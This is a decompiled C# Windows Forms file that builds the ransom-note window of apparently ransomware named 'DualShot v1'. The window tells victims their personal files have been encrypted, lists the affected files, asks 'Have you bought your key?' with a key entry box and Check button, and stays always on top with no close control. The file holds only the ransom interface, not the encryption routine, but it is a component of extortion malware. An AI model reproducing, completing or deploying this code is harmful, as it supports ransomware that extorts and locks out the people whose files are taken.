using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace DualShot;

public class MainWindow : Form
{
	private IContainer components;

	private Label title;

	private Label description;

	private Label label1;

	private TextBox aflist;

	private Label label2;

	private Label label3;

	private TextBox textBox1;

	private Button button1;

	public MainWindow(string[] fileslist, byte[] pvk)
	{
		InitializeComponent();
		((Control)aflist).Text = string.Join("\r\n", fileslist);
	}

	private void MainWindow_Load(object sender, EventArgs e)
	{
		((Control)title).Left = (((Form)this).ClientSize.Width - ((Control)title).Width) / 2;
		((Control)description).Left = (((Form)this).ClientSize.Width - ((Control)description).Width) / 2;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0378: Expected O, but got Unknown
		//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0406: Expected O, but got Unknown
		//IL_0463: Unknown result type (might be due to invalid IL or missing references)
		//IL_046d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainWindow));
		title = new Label();
		description = new Label();
		label1 = new Label();
		aflist = new TextBox();
		label2 = new Label();
		label3 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)title).AutoSize = true;
		((Control)title).Font = new Font("Microsoft YaHei", 16f, (FontStyle)1);
		((Control)title).ForeColor = Color.White;
		((Control)title).Location = new Point(53, 9);
		((Control)title).Name = "title";
		((Control)title).Size = new Size(659, 36);
		((Control)title).TabIndex = 0;
		((Control)title).Text = "Oops, your personal files have been encrypted!";
		title.TextAlign = (ContentAlignment)32;
		((Control)description).AutoSize = true;
		((Control)description).Font = new Font("Microsoft YaHei Light", 12f);
		((Control)description).ForeColor = Color.White;
		((Control)description).Location = new Point(23, 56);
		((Control)description).Name = "description";
		((Control)description).Size = new Size(756, 351);
		((Control)description).TabIndex = 1;
		((Control)description).Text = componentResourceManager.GetString("description.Text");
		description.TextAlign = (ContentAlignment)32;
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Microsoft YaHei", 13.2f, (FontStyle)1);
		((Control)label1).ForeColor = Color.White;
		((Control)label1).Location = new Point(12, 450);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(169, 30);
		((Control)label1).TabIndex = 2;
		((Control)label1).Text = "Affected files:";
		((Control)aflist).Location = new Point(12, 484);
		((TextBoxBase)aflist).Multiline = true;
		((Control)aflist).Name = "aflist";
		((TextBoxBase)aflist).ReadOnly = true;
		aflist.ScrollBars = (ScrollBars)3;
		((Control)aflist).Size = new Size(402, 197);
		((Control)aflist).TabIndex = 3;
		((Control)label2).Anchor = (AnchorStyles)9;
		((Control)label2).AutoSize = true;
		((Control)label2).Font = new Font("Microsoft Sans Serif", 4.8f);
		((Control)label2).ForeColor = Color.FromArgb(50, 50, 255);
		((Control)label2).Location = new Point(772, 9);
		((Control)label2).Name = "label2";
		((Control)label2).Size = new Size(56, 12);
		((Control)label2).TabIndex = 4;
		((Control)label2).Text = "DualShot v1";
		((Control)label3).AutoSize = true;
		((Control)label3).Font = new Font("Microsoft YaHei", 13.2f, (FontStyle)1);
		((Control)label3).ForeColor = Color.White;
		((Control)label3).Location = new Point(460, 450);
		((Control)label3).Name = "label3";
		((Control)label3).Size = new Size(319, 30);
		((Control)label3).TabIndex = 5;
		((Control)label3).Text = "Have you bought your key?";
		((Control)textBox1).Font = new Font("Microsoft YaHei", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)238);
		((Control)textBox1).Location = new Point(465, 494);
		((Control)textBox1).Name = "textBox1";
		((Control)textBox1).Size = new Size(314, 30);
		((Control)textBox1).TabIndex = 6;
		((Control)button1).Font = new Font("Microsoft YaHei Light", 7.8f);
		((Control)button1).Location = new Point(465, 542);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(314, 30);
		((Control)button1).TabIndex = 7;
		((Control)button1).Text = "Check";
		((ButtonBase)button1).UseVisualStyleBackColor = true;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(8f, 16f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.SteelBlue;
		((Form)this).ClientSize = new Size(840, 750);
		((Form)this).ControlBox = false;
		((Control)this).Controls.Add((Control)(object)button1);
		((Control)this).Controls.Add((Control)(object)textBox1);
		((Control)this).Controls.Add((Control)(object)label3);
		((Control)this).Controls.Add((Control)(object)label2);
		((Control)this).Controls.Add((Control)(object)aflist);
		((Control)this).Controls.Add((Control)(object)label1);
		((Control)this).Controls.Add((Control)(object)description);
		((Control)this).Controls.Add((Control)(object)title);
		((Form)this).FormBorderStyle = (FormBorderStyle)3;
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "MainWindow";
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "Warning";
		((Form)this).TopMost = true;
		((Form)this).Load += MainWindow_Load;
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
